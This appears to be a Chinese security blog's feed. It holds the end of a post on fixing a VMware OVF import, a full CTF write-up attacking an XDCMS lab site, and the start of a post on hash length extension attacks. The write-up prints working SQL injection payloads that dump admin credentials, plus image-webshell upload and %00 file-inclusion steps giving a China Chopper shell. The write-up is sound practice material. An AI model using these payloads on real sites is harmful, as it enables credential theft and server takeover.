class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AddressOnParent</span>&gt;</span>0<span class="tag">&lt;/<span class="name">rasd:AddressOnParent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>disk0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:HostResource</span>&gt;</span>ovf:/disk/vmdisk1<span class="tag">&lt;/<span class="name">rasd:HostResource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>9<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Parent</span>&gt;</span>3<span class="tag">&lt;/<span class="name">rasd:Parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>17<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AddressOnParent</span>&gt;</span>1<span class="tag">&lt;/<span class="name">rasd:AddressOnParent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AutomaticAllocation</span>&gt;</span>false<span class="tag">&lt;/<span class="name">rasd:AutomaticAllocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>cdrom0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>10<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Parent</span>&gt;</span>3<span class="tag">&lt;/<span class="name">rasd:Parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>15<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;slotInfo.pciSlotNumber&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;33&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;cpuHotAddEnabled&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;memoryHotAddEnabled&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;powerOpInfo.powerOffType&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;soft&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;powerOpInfo.resetType&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;soft&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;powerOpInfo.suspendType&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;soft&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.afterPowerOn&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.afterResume&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.beforeGuestShutdown&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.beforeGuestStandby&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.syncTimeWithHost&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;tools.toolsUpgradePolicy&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;upgradeAtPowerCycle&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">VirtualHardwareSection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">AnnotationSection</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Info</span>&gt;</span>A human-readable annotation<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Annotation</span>&gt;</span>--[[~~Enjoy. Have fun. Happy Hacking.~~]]--</span><br><span class="line"></span><br><span class="line">+ There are multiple methods to-do this machine: At least</span><br><span class="line">-- Two (2) paths to get a limited shell</span><br><span class="line">-- At least three (3) ways to get a root access<span class="tag">&lt;/<span class="name">Annotation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">AnnotationSection</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">VirtualSystem</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>更新 <code>Stapler.ovf</code> 文件后，切记需重新计算其 SHA-1 散列值，并在 <code>Stapler.mf</code> 文件中替换，否则无法通过文件完整性校验：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/replace-ovf-sha1.png" alt="replace-ovf-sha1"></p>
<p>完成以上步骤后，再次打开 <code>Stapler.ovf</code> 文件，发现不再报错，并提示导入虚拟机：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/open-ovf-success.png" alt="open-ovf-success"></p>
<p>选择虚拟机存储路径后，导入并开机，最终成功初始化，出现了 Stapler 靶机的登录界面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/stapler-login.png" alt="stapler-login"></p>
<h2 id="有待深究"><a href="#有待深究" class="headerlink" title="有待深究"></a>有待深究</h2><p>至此，镜像导入问题暂时得到解决，不过仍留有两处问题，有待深究：</p>
<ul>
<li>Stapler 的镜像提供者，在用 VMware 导入镜像时，其 ovf 文件为什么不是按标准格式排序，而是乱序？</li>
<li>为什么通过新建虚拟机导入 vmdk 会初始化失败？</li>
</ul>
<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>由于本人时间精力有限，此文旨在记录 VMware 镜像导入问题的解决过程，对部分问题未能继续深究，望谅解。文中不足之处，还请各位不吝赐教，感谢阅读！</p>
<p>本文相关参考请见：</p>
<blockquote>
<p><a href="https://nolabnoparty.com/en/vmware-fix-invalid-ovf-manifest-entry-error/">VMware fix “Invalid OVF manifest entry” error</a><br><a href="https://sites.google.com/site/vblog77/notes/ovf-ova">Difference between OVA and OVF</a><br><a href="https://docs.citrix.com/en-us/xencenter/7-1/vms-exportimport-ovf.html">Open Virtualization Format (OVF and OVA)</a><br><a href="https://www.dmtf.org/sites/default/files/standards/documents/DSP0243_1.1.0.pdf">Open Virtualization Format Specification (DSP0243_1.1.0)</a><br><a href="https://www.dmtf.org/sites/default/files/standards/documents/DSP0243_2.0.0.pdf">Open Virtualization Format Specification (DSP0243_2.0.0)</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Tips</category>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
        <tag>VM</tag>
        <tag>VMware</tag>
        <tag>Solution</tag>
      </tags>
  </entry>
  <entry>
    <title>【i春秋】渗透测试入门 —— 你是会员吗？</title>
    <url>/2018/03/08/ichunqiu-pentest-introduction-are-you-vip/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本题的目标是一个<strong>基于 XDCMS（目前官网貌似被黑）的订餐管理系统</strong>，XDCMS 是各大漏洞平台的常客，维护效率极低，基本过时淘汰，常用于渗透测试的练习靶机。</p>
<p>以下的问题均源自于两个典型的漏洞利用。第 1 题由 SQL 注入漏洞可得到管理员的密码散列值，进而破解得到密码明文；第 2 题先将一句话木马插入图片中，再将图片马上传到服务器，最后利用文件包含漏洞，顺利地将<a href="http://www.zhongguocaidao.com/">中国菜刀</a>与服务器连接，即可看到网站根目录下的 flag 文件。</p>
<ul>
<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=2&r=54399">https://www.ichunqiu.com/battalion?t=2&r=54399</a></li>
<li>解题链接：<a href="https://www.ichunqiu.com/vm/50679/1">https://www.ichunqiu.com/vm/50679/1</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/guide.png" alt="guide"></p>
<h1 id="0x01-获取目标网站管理员的密码"><a href="#0x01-获取目标网站管理员的密码" class="headerlink" title="0x01 获取目标网站管理员的密码"></a>0x01 获取目标网站管理员的密码</h1><p>从题目的暗示来看，应该与网站的会员注册有关。搜索一番后，发现了两个 SQL 注入漏洞均可获得管理员的账号密码，且都能在实验靶机上成功复现。</p>
<h2 id="注册会员处的-SQL-注入"><a href="#注册会员处的-SQL-注入" class="headerlink" title="注册会员处的 SQL 注入"></a>注册会员处的 SQL 注入</h2><p>第一个漏洞是由于 <code>/system/modules/member/index.php</code> 中的注册函数 <code>register_save()</code> 过滤不严，可绕过限制造成 SQL 注入。漏洞原理在此没有深究，只是对该漏洞进行利用，详情可参考：</p>
<blockquote>
<p><a href="http://www.hack80.com/forum.php?mod=viewthread&tid=22401">xdcms注册用户处SQL注入漏洞</a></p>
</blockquote>
<p>接下来打开 Chrome 浏览器，进入默认首页，点击 <strong>免费注册</strong>，根据提示填写好对应信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/register-info.png" alt="register-info"></p>
<p>下面要利用 <a href="https://portswigger.net/burp">Burp Suite</a> 工具，准备对注册信息进行抓包改包。依次打开工具箱中的【抓包改包】-&gt;【Burp Suite】文件夹，双击【BurpLoader.jar】，弹出的所有提示框点击 <strong>确定</strong> 即可：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/burp-path.png" alt="burp-path"></p>
<p>回到浏览器，设置局域网本地代理，依次点击 <strong>设置 -&gt; 更改代理服务器设置 -&gt; 连接 -&gt; 局域网设置</strong>，在 <strong>为 LAN 使用代理服务器</strong> 前打钩，在<strong>地址</strong>上填 <code>127.0.0.1</code>，在<strong>端口</strong>上填 <code>8080</code>，最后点击 <strong>确定</strong> 返回即可：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/proxy-setting.png" alt="proxy-setting"></p>
<p>设置完毕后，回到注册页面，点击 <strong>注册</strong> 后，在 Burp Suite 上点击 <strong>Proxy -&gt; Intercept -&gt; Raw</strong> 选项卡，看到了成功抓取的注册数据包：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/register-capture.png" alt="register-capture"></p>
<p>再依次点击 <strong>Action -&gt; Send to Repeater</strong>，便可在 <strong>Repeater</strong> 选项卡中看到刚才抓取的数据包，用于进行重放攻击：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/register-repeater.png" alt="register-repeater"></p>
<p>根据漏洞报告中的利用方法以及 payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,password) FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b#</span></span><br></pre></td></tr></table></figure>

<p>将该 payload 插入请求数据的 <code>username</code> 参数中，点击 <strong>Go</strong>，在响应数据中即可看到报错信息中泄露的管理员账号密码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/register-repeater-response.png" alt="register-repeater-response"></p>
<p>当然也可直接在 <strong>Proxy</strong> 选项卡中插入 payload，点击 <strong>Forward</strong>，将抓取的数据包转发给服务器：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/register-proxy-forward.png" alt="register-proxy-forward"></p>
<p>在浏览器的注册响应信息中同样能看到账号密码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/register-proxy-response.png" alt="register-proxy-response"></p>
<h2 id="会员资料修改处的-SQL-注入"><a href="#会员资料修改处的-SQL-注入" class="headerlink" title="会员资料修改处的 SQL 注入"></a>会员资料修改处的 SQL 注入</h2><p>第二个漏洞也是由于 <code>/system/modules/member/index.php</code> 中的编辑函数 <code>edit_save()</code> 过滤不严，可绕过限制造成 SQL 注入。同样地，此处不研究漏洞原理，只对该漏洞进行利用，详情可参考：</p>
<blockquote>
<p><a href="http://www.anquan.us/static/bugs/wooyun-2013-043334.html">xdcms通用型全版本注入漏洞</a></p>
</blockquote>
<p>利用刚刚注册好的 <strong>sql_injection</strong> 账户登录，准备对 <strong>资料管理 -&gt; 基本资料</strong> 中的 <strong>姓名</strong> 进行修改：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/modify-info.png" alt="modify-info"></p>
<p>打开 Burp Suite 后，点击 <strong>更新</strong>，成功截取到更改请求数据包：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/modify-capture.png" alt="modify-capture"></p>
<p>根据漏洞报告中的利用方法以及 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23</span><br></pre></td></tr></table></figure>

<p>该 payload 经过 URL 解码后为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">`<span class="operator">=</span>(<span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,password) <span class="keyword">from</span> c_admin <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<p>将该 payload 插入请求数据的 <code>field%5Btruename%5D</code>中，<strong>注意是要将经过 URL 编码后 payload 插入到 <code>truename</code> 与 <code>%5D</code> 之间</strong>，否则漏洞利用失败。接着点击 <strong>Forward</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/modify-forward.png" alt="modify-forward"></p>
<p>资料更新成功后，在 <strong>基本资料</strong> 中可看到在 <strong>姓名</strong> 处成功泄露了管理员的账号密码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/modify-response.png" alt="modify-response"></p>
<p>最终得到管理员账号为 <code>xdcms121</code>，密码为 <code>1be20cb2907edca1e4f55f375a5663f1</code>，从摘要长度猜测此为 MD5 哈希算法，用 <a href="http://www.dmd5.com/md5-decrypter.jsp">MD5解密工具</a> 得到结果 <code>e890790166bfb88ee91047c64cda7aad</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/md5-1.png" alt="md5-1"></p>
<p>看来思路没错，再对其进行一次解密，终于得到密码明文 <code>xdcms212</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/md5-2.png" alt="md5-2"></p>
<p>接下来成功渗透后，即可看到 <code>/system/modules/member/index.php</code> 中 <code>register_save()</code> 函数处理密码明文的哈希算法源码，确实是对密码明文进行了连续两次的 MD5 哈希计算：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/md5-source.png" alt="md5-source"></p>
<h1 id="0x02-获取目标网站目录中的-flag-文件信息"><a href="#0x02-获取目标网站目录中的-flag-文件信息" class="headerlink" title="0x02 获取目标网站目录中的 flag 文件信息"></a>0x02 获取目标网站目录中的 flag 文件信息</h1><p>打开工具箱【目录扫描】文件夹下的【御剑后台扫描工具】，对目标 URL 进行扫描：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/directory-scan.png" alt="directory-scan"></p>
<p>可轻松得到并成功验证后台登录页面 <code>/admin/index.php</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/login.png" alt="login"></p>
<p>用账号 <code>xdcms121</code> 与密码 <code>xdcms212</code> 登录后台后，根据实验手册提示，要用菜刀与服务器连接，并在网站目录中获取 flag 文件信息。我们接着搜索可利用的漏洞，发现 <code>/system/function/global.inc.php</code> 存在文件包含漏洞。根据漏洞说明，我们可将一句话木马插入图片中，再将图片马上传到服务器，利用 URL 查询字符串的 <code>m</code> 参数指向图片马的路径，最终触发文件包含漏洞，等待菜刀连接。该漏洞详情可参考：</p>
<blockquote>
<p><a href="http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-043382">XDcms控制器绕过漏洞（可本地包含）</a></p>
</blockquote>
<p>因此，首先来制作图片马。任意找到一张图片 <code>logo.jpg</code>（此处以 XDCMS 的 logo 为例），新建含有一句话木马的文本文档 <code>trojan.txt</code>，在命令行模式下用 <a href="https://baike.baidu.com/item/copy/10465712"><code>copy</code></a> 命令合并两个文件：</p>
<blockquote>
<p>小贴士：在 Windows 命令行下输入 <code>help copy</code>，即可看到 <code>copy</code> 命令的使用说明，限于篇幅在此省略。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/copy.png" alt="copy"></p>
<p>用 【Notepad++】查看图片马 <code>result.jpg</code>，发现图片末尾确实已插入了一句话木马：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/notepad.png" alt="notepad"></p>
<p>所以即使不用 <code>copy</code> 命令，直接将木马粘贴在图片末尾也是可以的，此处就不演示了。</p>
<p>回到后台管理界面，依次点击 <strong>模块管理 -&gt; 幻灯片管理 -&gt; 添加幻灯</strong>，发现此处能够上传图片，在 <strong>名称</strong> 处填上任意字符（此处以 <code>upload trojan</code> 为例），在 <strong>链接地址</strong> 处填上 <code>http://www.test.ichunqiu</code>（不知能否填任意地址，保险起见此处填入相关地址），接着点击 <strong>上传</strong>，选择图片马 <code>result.jpg</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/upload-trojan.png" alt="upload-trojan"></p>
<p>再次点击 <strong>上传</strong> 后，发现 <strong>图片</strong> 一栏仍为空，需要<strong>手动填写图片马的绝对地址</strong>（这里真心想吐槽这个不合理的设计&#x3D;_&#x3D;!!!），填写完点击 <strong>保存</strong> 即可：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/upload-save.png" alt="upload-save"></p>
<p>咦，怎么在 <strong>幻灯片管理</strong> 页面没显示图片马在服务器上的地址？点击 <strong>编辑</strong> 亦是如此：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/upload-manager.png" alt="upload-manager"></p>
<p>这个点也是本题的一大坑，大家也许注意到了，既然 <strong>图片</strong> 一栏要手动填写地址，那前面还需要点击 <strong>上传</strong> 来选择图片马吗？其实这是为了用 Burp Suite 抓取数据包，获得图片马在服务器上的地址。</p>
<p>如果刚刚忘记打开 Burp Suite，现在请打开，并设置好浏览器的局域网本地代理，严格按照上述的上传步骤重新将图片马上传。成功上传后，可在 <strong>Proxy -&gt; History</strong> 中点击相应记录，并在 <strong>Response -&gt; Raw</strong> 中看到图片马的地址为 <code>/uploadfile/image/20180309/201803090113470.jpg</code>：</p>
<blockquote>
<p>小贴士：在上传图片马的步骤中，在 <strong>Proxy -&gt; Intercept</strong> 中点击关闭截取功能，操作起来更加顺畅。当显示 <code>Intercept is off</code> 表示已关闭截取功能。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/upload-path.png" alt="upload-path"></p>
<p>由于 <code>/uploadfile/</code> 在网站根目录下，而根据漏洞说明中的源码，可知参数 <code>m</code> 是在 <code>/system/function/global.inc.php</code> 文件中被引用，文件包含的关键语句如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> MOD_PATH.<span class="variable">$m</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>; <span class="comment">//调用类</span></span><br></pre></td></tr></table></figure>

<p>因此使用菜刀 <strong>添加SHELL</strong> 时，赋值给 <code>m</code> 的图片马路径需要先从 <code>MOD_PATH</code> 返回根目录，拟在前面添加 <code>../../</code>，猜测向上返回两级目录后可到达根目录，若猜测正确即能指向图片马的路径：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/add-shell.png" alt="add-shell"></p>
<p>接下来尝试连接服务器，结果得到报错信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/get-shell-error.png" alt="get-shell-error"></p>
<p>原因是参数 <code>m</code> 被引用到源码后，后面还连了一段字符串，该字符串默认情况下是 <code>/index.php</code>，在漏洞说明的源码中可得到验证。所以可在参数 <code>m</code> 末尾加入空字符 <code>%00</code>，对源码中的 <code>include</code> 语句进行截断。详情可参考：</p>
<blockquote>
<p><a href="http://www.jinglingshu.org/?p=1339">文件上传之\00截断与文件包含之%00截断 文件包含漏洞详解</a></p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/add-shell-null.png" alt="add-shell-null"></p>
<p>如无意外，成功地连接上服务器，并在根目录下看到 flag 文件 <code>flag9szsed-fdzvc4-1l3iza.txt</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/server-root.png" alt="server-root"></p>
<p>打开 flag 文件即可获得 <code>key&#123;7h7hii9a&#125;</code>，大功告成，因此第 2 题答案就是 <code>7h7hii9a</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/flag.png" alt="flag"></p>
<p>另外，如果等得起暴力目录扫描的话，直接可以扫出 <code>http://www.test.ichunqiu/flag9szsed-fdzvc4-1l3iza.txt</code>，然后往浏览器一扔：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/flag-browser.png" alt="flag-browser"></p>
<p>呵呵…想想就好，还是按部就班的渗透吧~</p>
<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>获得 webshell 后，除了查看 flag 文件，还能查看所有后台文件的源码，包括上述的 MD5 哈希算法，以及在 <code>/system/common.inc.php</code> 与 <code>/system/function/global.inc.php</code> 中进一步验证了参数 <code>m</code> 的值是跟在 <code>/system/modules/</code> 后面的，所以，需要向上返回两级目录的猜测是正确的：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/mod-path.png" alt="mod-path"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-are-you-vip/include.png" alt="include"></p>
<p>本次渗透过程没有用到实验手册中提到的 <a href="http://sqlmap.org/">SQLMap</a>，若有使用其他工具或有新奇的渗透思路，还请各位前辈多多指教。最后向以下三篇参考 writeup 的作者表示致谢！</p>
<blockquote>
<p><a href="https://bbs.ichunqiu.com/thread-19746-1-1.html">10-在线挑战详细攻略-《你是会员吗》 </a><br><a href="https://bbs.ichunqiu.com/thread-8816-1-1.html">你是会员吗？</a><br><a href="https://bbs.ichunqiu.com/thread-8263-1-1.html">你是会员吗挑战攻略</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>PHP</tag>
        <tag>Crypto</tag>
        <tag>i春秋</tag>
        <tag>Pentest</tag>
        <tag>Exploit</tag>
        <tag>CMS</tag>
        <tag>SQLi</tag>
        <tag>Trojan</tag>
        <tag>Vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash Length Extension Attack（哈希长度扩展攻击）</title>
    <url>/2017/11/12/hash-length-extension-attack/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong><a href="https://en.wikipedia.org/wiki/Length_extension_attack">Hash Length Extension Attack</a>（<a href="https://zh.wikipedia.org/w/index.php?title=%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB">哈希长度扩展攻击</a>）</strong>是针对采用了 <a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction">Merkle–Damgård 结构</a>的哈希函数的攻击手段，如 MD5、SHA-1 和 SHA-2 等。该攻击可以伪造消息散列值，产生新的合法数字签名，对数据的完整性和不可否认性造成严重威胁。</p>
<p>本文以 MD5 为例，0x01 介绍 MD5 的基本原理；0x02 介绍 Hash Length Extension Attack 的漏洞原理与漏洞修复方法，并在假设场景下展示了漏洞利用过程；0x03 介绍攻击工具 HashPump 的使用；0x04 借助相关的 CTF 题目来展示此漏洞的利用方法。</p>
<p>阅读本文需要<strong>理解 MD5 哈希函数的原理</strong>，以及<strong>在 Linux 下熟练使用命令行工具</strong>。</p>
<span id="more"></span>

<h1 id="0x01-MD5-Hash-Function"><a href="#0x01-MD5-Hash-Function" class="headerlink" title="0x01 MD5 Hash Function"></a>0x01 MD5 Hash Function</h1><p>为了后续更好地理解 Hash Length Extension Attack，首先简单介绍一下 MD5 的算法流程。</p>
<p><a href="https://en.wikipedia.org/wiki/MD5">MD5</a> 算法由美国麻省理工密码学家 <a href="https://en.wikipedia.org/wiki/Ron_Rivest">Ronald Rivest</a> 在 MD2、MD3 与 MD4 的基础上设计而成，并在 1992 年公开发表，在规范 <a href="https://tools.ietf.org/html/rfc1321">RFC 1321</a> 中作了详尽阐述。</p>
